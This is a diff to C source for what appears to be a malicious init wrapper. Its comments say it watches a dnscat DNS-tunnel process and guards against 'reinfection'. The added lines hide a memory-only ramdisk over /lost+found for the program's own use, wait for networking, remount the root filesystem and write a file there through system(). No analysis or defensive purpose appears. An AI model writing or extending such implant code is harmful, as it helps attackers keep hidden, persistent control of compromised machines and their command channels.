@@ -242,6 +242,10 @@ int main(int argc, char **argv)
         } else {
                 /* Parent process */
 
+                /* plop a ramdisk over lost+found for our use */
+		if (mount("tmpfs", "/lost+found", "tmpfs", MS_PRIVATE | MS_STRICTATIME, "mode=755") < 0)
+                        err_exit("couldn't mount ramdisk!");
+
                 /* install signal handler to handle signal delivered
                  * ctrl-alt-delete, which we will send to child init
                  */
@@ -249,6 +253,16 @@ int main(int argc, char **argv)
                         err_exit("couldn't install signal handler");
                 if (reboot(LINUX_REBOOT_CMD_CAD_OFF) < 0)
                         err_exit("couldn't turn cad off");
+
+                /* wait for things to come up and networking to be
+		 * ready
+		 */
+		sleep(20);
+
+		if (mount(NULL, "/", NULL, MS_REMOUNT | MS_RELATIME,
+			  "errors=remount-ro,data=ordered") < 0)
+                        err_exit("couldn't remount /");
+                system("echo ciao > /lost+found/file.txt");
 
                 /* watching for dnscat exit
                  * also, watching for reinfection
